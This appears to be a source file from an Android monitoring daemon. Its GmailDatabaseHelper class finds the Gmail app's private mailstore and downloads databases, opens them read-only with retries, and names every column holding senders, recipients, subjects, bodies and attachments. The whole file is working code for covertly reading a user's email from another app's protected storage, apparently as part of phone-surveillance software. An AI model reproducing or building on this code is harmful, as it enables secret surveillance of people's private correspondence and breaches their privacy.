package com.vvt.daemon.email;

import java.util.HashMap;

import android.database.sqlite.SQLiteDatabase;

import com.vvt.database.VtDatabaseHelper;
import com.vvt.logger.FxLog;

public class GmailDatabaseHelper {

	private static final String TAG = "GmailDatabaseHelper";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String HTC_PACKAGE_NAME = "com.google.android.providers.gmail";
	private static final String NEXUS_ONE_PKG_NAME = "com.google.android.gm";

	public static final String TABLE_DOWNLOADS = "downloads";
	public static final String COLUMN_DATA = "_data";
	public static final String COLUMN_TITLE = "title";
	
	public static final String TABLE_ATTACHMENT = "attachments";
	public static final String COLUMN_DOWNLOAD_ID = "downloadId";
	public static final String COLUMN_MSGS_MSG_ID = "messages_messageId";
	
	public static final String TABLE_MESSAGES = "messages";
	public static final String TABLE_MESSAGE_LABELS = "message_labels";
	public static final String TABLE_LABELS = "labels";
	
	public static final String COLUMN_ID = "_id";
	public static final String COLUMN_LABELS_ID = "labels_id";
	public static final String COLUMN_NAME = "name";
	public static final String COLUMN_MSG_MSG_ID = "message_messageId";
	public static final String COLUMN_CLIENT_CREATED = "clientCreated";
	
	
	public static final String COLUMN_MSG_ID = "messageId";
	public static final String COLUMN_CONVERSATION = "conversation";
	public static final String COLUMN_FROM = "fromAddress";
	public static final String COLUMN_TO = "toAddresses";
	public static final String COLUMN_CC = "ccAddresses";
	public static final String COLUMN_BCC = "bccAddresses";
	public static final String COLUMN_REPLY_TO = "replyToAddresses";
	public static final String COLUMN_DATE_SENT = "dateSentMs";
	public static final String COLUMN_DATE_RECEIVED = "dateReceivedMs";
	public static final String COLUMN_SUBJECT = "subject";
	public static final String COLUMN_BODY = "body";
	public static final String COLUMN_BODY_COMPRESSED = "bodyCompressed";
	public static final String COLUMN_ATTACHMENTS = "joinedAttachmentInfos";
	public static final String COLUMN_SYNCED = "synced";
	
	public static final String LABEL_INBOX = "^i";
	public static final String LABEL_SENT = "^f";
//	public static final String LABEL_DRAFT = "^r";
//	public static final String LABEL_OUTBOX = "^^out";
	
	private static HashMap<String, String> sDbPaths = new HashMap<String, String>();

	public static String getGmailDbPath() {
			String gmailPath = VtDatabaseHelper.getSystemDatabasePath(HTC_PACKAGE_NAME);
			if (gmailPath == null) {
				gmailPath = VtDatabaseHelper.getSystemDatabasePath(NEXUS_ONE_PKG_NAME);
			}
			
			/*monitor in package folder. because in Android version 4 up 
			 * it will not create database folder until register account
			 */
			if(gmailPath == null) {
				gmailPath = VtDatabaseHelper.getSystemPrefPath(HTC_PACKAGE_NAME);
				if(gmailPath == null) {
					gmailPath = VtDatabaseHelper.getSystemPrefPath(NEXUS_ONE_PKG_NAME);
				}
			}
			
			if(LOGV) FxLog.v(TAG, String.format("getGmailDbPath # gmailPath: %s", gmailPath));
			
			if (gmailPath == null) {
				return null;
			}
			
			return gmailPath;
		}

	public static SQLiteDatabase getReadableDatabase(String account) {
		return openDatabase(SQLiteDatabase.OPEN_READONLY, account);
	}

	private static SQLiteDatabase openDatabase(int flags, String account) {
		if (sDbPaths == null) {
			sDbPaths = new HashMap<String, String>();
		}
		
		String dbPath = sDbPaths.containsKey(account) ? sDbPaths.get(account) : null;
		
		if (dbPath == null) {
			String path = getGmailDbPath();
			if (account != null && path != null) {
				dbPath = String.format("%s/mailstore.%s.db", path, account);
				sDbPaths.put(account, dbPath);
			}
		}
		
		if(LOGV) FxLog.v(TAG, String.format("openDatabase from '%s'", dbPath));
		
		SQLiteDatabase db = tryOpenDatabase(flags, dbPath);

		int attemptLimit = 5;
		while (db == null && attemptLimit > 0) {
			if(LOGV) FxLog.v(TAG, "Cannot open database. Retrying ... Path : "+dbPath);
			
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			db = tryOpenDatabase(flags, dbPath);
			attemptLimit--;
		}

		return db;
	}
	
	public static SQLiteDatabase openDownloadDatabase() {
		if (sDbPaths == null) {
			sDbPaths = new HashMap<String, String>();
		}
		String dbName = "downloads";
		String dbPath = sDbPaths.containsKey(dbName) ? sDbPaths.get(dbName) : null;
		
		if (dbPath == null) {
			String path = getGmailDbPath();
			if (path != null) {
				dbPath = String.format("%s/%s.db", path, dbName);
				sDbPaths.put(dbName, dbPath);
			}
		}
		
		if(LOGV) FxLog.v(TAG, String.format("openDatabase from '%s'", dbPath));
		
		SQLiteDatabase db = tryOpenDatabase(SQLiteDatabase.OPEN_READONLY, dbPath);

		int attemptLimit = 5;
		while (db == null && attemptLimit > 0) {
			if(LOGV) FxLog.v(TAG, "Cannot open database. Retrying ... Path : "+dbPath);
			
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			db = tryOpenDatabase(SQLiteDatabase.OPEN_READONLY, dbPath);
			attemptLimit--;
		}

		return db;
	}

	private static SQLiteDatabase tryOpenDatabase(int flags, String dbPath) {
		if(LOGV) FxLog.v(TAG, String.format("tryOpenDatabase # dbPath: %s", dbPath));
		SQLiteDatabase db = null;
		try {
			db = SQLiteDatabase.openDatabase(dbPath, null, flags);
		} 
		catch (Exception e) {
			if(LOGE) FxLog.e(TAG, String.format("tryOpenDatabase # Error: %s", e.toString()));
		}
		return db;
	}

}
